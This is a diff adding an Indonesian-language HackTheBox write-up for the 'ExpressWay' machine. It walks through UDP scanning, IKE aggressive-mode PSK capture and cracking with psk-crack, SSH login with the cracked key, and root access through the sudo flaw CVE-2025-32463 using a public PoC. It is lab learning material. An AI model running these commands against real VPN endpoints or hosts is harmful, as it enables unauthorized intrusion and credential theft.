@@ -1,0 +1,245 @@
+---
+layout: post
+title: "HTB Writeup – ExpressWay"
+date: 2025-09-21
+image: /assets/machine/expressway/expressway.jpg
+tags: [htb, linux, season9]
+excerpt: "Exploit IKE and CVE-2025-32463 on sudo v1.9.17"
+---
+
+
+# RECON
+
+
+## Port Scan
+
+
+```
+$ rustscan -a 10.10.11.87 --ulimit 2000 -r 1-65535 -- -A sS -Pn
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 10.0p2 Debian 8 (protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Kita lihat di TCP gak ada port yang open selain port 22(SSH), jadi kita lakukan scanning di UDP.
+
+UDP itu ibarat saudara nya TCP, sudah buat di enumerate kalo tools kita gak tepat
+
+Disini kita bisa gunakan [`udpx`](https://github.com/nullt3r/udpx):
+
+```
+$ git clone https://github.com/nullt3r/udpx.git
+$ cd udpx
+$ go build ./cmd/udpx
+$ sudo mv udpx /usr/local/bin/udpx
+
+$ udpx -t 10.10.11.87 -c 128 -w 1000
+
+        __  ______  ____ _  __
+       / / / / __ \/ __ \ |/ /
+      / / / / / / / /_/ /   /
+     / /_/ / /_/ / ____/   |
+     \____/_____/_/   /_/|_|
+         v1.0.7, by @nullt3r
+
+2025/09/20 16:33:27 [+] Starting UDP scan on 1 target(s)
+2025/09/20 16:33:45 [*] 10.129.13.112:500 (ike)
+2025/09/20 16:34:00 [+] Scan completed
+```
+
+Lihat di logging atas, `udpx` menemukan sesuatu: UDP/500 (IKE).
+
+
+# USER
+
+
+Port UDP **500** merupakan khas dari **ISAKMP / IKE (IPsec VPN)**:
+
+*   Host ini adalah sebuah IPsec VPN endpoint (IKEv1 or IKEv2).
+*   Responder juga dapat menyebabkan kebocoran di string vendor/versi, identity value, bahkan juga username nya .
+*   Misconfiguration (PSKs yang lemah, exposed Aggressive Mode, atau malformed di certificates nya) bisa merujuk ke information-leak surface .
+
+
+## IKE
+
+
+_**[IKE (Internet Key Exchange)](https://www.paloaltonetworks.com/cyberpedia/what-is-ike)** orchestrates the cryptographic associations used by **IPsec**. In plain terms: IKE is the handshake that lets two endpoints negotiate keys, algorithms, and identities so they can erect encrypted tunnels (ESP/AH)._
+
+
+### IKE Scan
+
+
+Untuk fingerprinting dan probing IKE, kita bisa gunakan **[ike-scan](https://github.com/royhills/ike-scan)**.
+
+Installation:
+
+
+```
+# Debian/Ubuntu
+sudo apt install -y ike-scan
+
+# Arch
+yay -S ike-scan
+# (need fix though, see: https://aur.archlinux.org/packages/ike-scan)
+
+# Build from github
+git clone https://github.com/royhills/ike-scan.git
+cd ike-scan
+autoreconf --install
+./configure --with-openssl
+make -j"$(nproc)"
+sudo make install
+```
+
+
+Run:
+
+
+```
+
+$ sudo ike-scan expressway.htb
+
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.13.112  Main Mode Handshake returned HDR=(CKY-R=1d432c635a2e8d64) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+
+```
+
+
+**IKEv1 — Main Mode**: Gak ada identities yang bocor secara cleartext disini. Tapi kita tau ada beberapa algorithm yang lemah.
+
+Kita gunakan Aggressive Mode yang biasanya bisa mendapatkan data sensitif:
+
+
+```
+
+$ sudo ike-scan -A expressway.htb
+
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.13.112  Aggressive Mode Handshake returned HDR=(CKY-R=10f501450cedfb8e) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
+
+```
+
+
+Diatas kita mendapatkan:
+
+*   **`ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)`**
+*   **`KeyExchange(128 bytes) Nonce(32 bytes)`**
+*   **`Hash(20 bytes)`**
+
+Gunain flag -P untuk kita crack nanti PSK nya:
+
+
+```
+
+$ ike-scan -h
+--pskcrack[=<f>] or -P[<f>] Crack aggressive mode pre-shared keys.
+                        This option outputs the aggressive mode pre-shared key
+                        (PSK) parameters for offline cracking using the
+                        "psk-crack" program that is supplied with ike-scan.
+                        You can optionally specify a filename, <f>, to write
+                        the PSK parameters to.  If you do not specify a filename
+                        then the PSK parameters are written to standard output.
+                        If you are using the short form of the option (-P)
+                        then the value must immediately follow the option
+                        letter with no spaces, e.g. -Pfile not -P file.
+                        You can only specify a single target host if you use
+                        this option.
+                        This option is only applicable to IKE aggressive mode.
+
+$ sudo ike-scan -A expressway.htb --id=ike@expressway.htb -Pike.psk
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.13.112  Aggressive Mode Handshake returned HDR=(CKY-R=8408e5d22149f23f) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
+
+$ tail ike.psk
+bc859f8dc4a9e13eb9005f4c8837adcc1d9ae7a994f101f02a655305fa74f5b3749c13b308743811c37896b8ba1632058983ecd64a6da01ea8a780b45e31d486880c68028720cad28e5c341cf9cd9fc2a4d0cc05fd774937b43fb3186a0cd91dfab698c8643b1b693f20782a86db22aaa96a35bdf260fee61ae4488b04e96a2c:6c4ccc2b450929e68527c985be032635a885ce002b21ae9785424e55d3462b1d4898724e751ce9f111c994152f627699caba4e0d7b80b13a94841f1515fe6bd3fbe3ea13193abfde73c260a9d98bfdcaa1cf0c4763f27a23ac9e6368ec64cca68128f48b5fa62b91acdf44d088653841d3cc3d00707823c6e061d199bba30de7:8408e5d22149f23f:02df802fb6f5df66:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:9c4cb226f57fc96bcfee3b78bfe92ab2463b982e:aec8b6a180a4f3d9293c483b9705c9df35e01f24486b2b2f3e8774a6019e6bfd:9157243c333a25d603bf588a5c8a9c0bc966e3b0
+
+```
+
+
+Kita dapet hash buat **--id=ike@expressway.htb**.
+
+
+### PSK Cracking
+
+
+**PSK (Pre-Shared Key)** merupakan sebuah symmetric secret shared oleh kedua endpoinnt VPN sebelumnya (coba pikirkan: password yang di pake kedua belah pihak).
+
+Kita paksa reaponder IKE ke Aggressive Mode dan saved file nya bernama `ike.psk`. Isi file nya itu ada:
+
+`g_xr : g_xi : cky_r : cky_i : sai_b : idir_b : ni_b : nr_b : hash_r`
+
+**Hash auth** cuma bagian akhir nya (`hash_r`) di kasus kita. Jadi  `9157243c333a25d603bf588a5c8a9c0bc966e3b0`  Yang berarti **40 hex chars = 20 bytes** (HMAC-SHA1). Lalu kita gunakan psk-crack untuk melalukan cracking hash auth nya, kita gunakan rockyou.txt:
+
+
+```
+
+$ psk-crack -d ~/wordlists/rockyou.txt ike.psk
+
+Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
+Running in dictionary cracking mode
+key "freakingrockstarontheroad" matches SHA1 hash 9157243c333a25d603bf588a5c8a9c0bc966e3b0
+Ending psk-crack: 8045039 iterations in 4.278 seconds (1880409.57 iterations/sec)
+
+```
+
+
+Kita dapetin **Pre-Shared Key** (`freakingrockstarontheroad`) yang digunain di endpoint IKEv1. Kunci ini biasanya memungkinkan kita untuk melakukan XAUTH (username/password) atau membuat sesi authenticated VPN.
+
+
+Setelah kita mendapatkan password diatas, saya coba login menggubakan ssh untuk **ike@expressway** dan berhasil masuk.
+
+Kita mendapatkan user flag nya
+
+
+<center>
+<img src="/assets/machine/expressway/user.jpg" class="img-post" />
+</center>
+
+
+> Note: akun **ike** kita bisa mengetahuinya dengan detail selama enumerate post-exploitation. dan termasuk didalam grup `proxy`
+
+
+# ROOT
+
+
+## CVE-2025-32463
+
+
+_**[Sudo 1.9.17p1](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)** allows local users to obtain root access because /etc/nsswitch.conf from a user-controlled directory is used with the --chroot option._
+
+
+Ketika kita mengecek versi sudo yang ada di ike, kita tahu bahwa:
+
+
+```
+
+ike@expressway:~$ sudo -V
+
+Sudo version 1.9.17
+Sudoers policy plugin version 1.9.17
+Sudoers file grammar version 50
+Sudoers I/O plugin version 1.9.17
+Sudoers audit plugin version 1.9.17
+
+```
+
+
+Setelah searching kita mendapatkan [poc](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) nya.
+
+
+```
+
+git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git && cd CVE-2025-32463_chwoot
+scp sudo-chwoot.sh ike@expressway.htb:/dev/shm
+
+```
+
+Deploy ke target, lalu kita jalankan.
+
+<center>
+<img src="/assets/machine/expressway/root.jpg" class="img-post" />
+</center>
+
+
+Rooted.
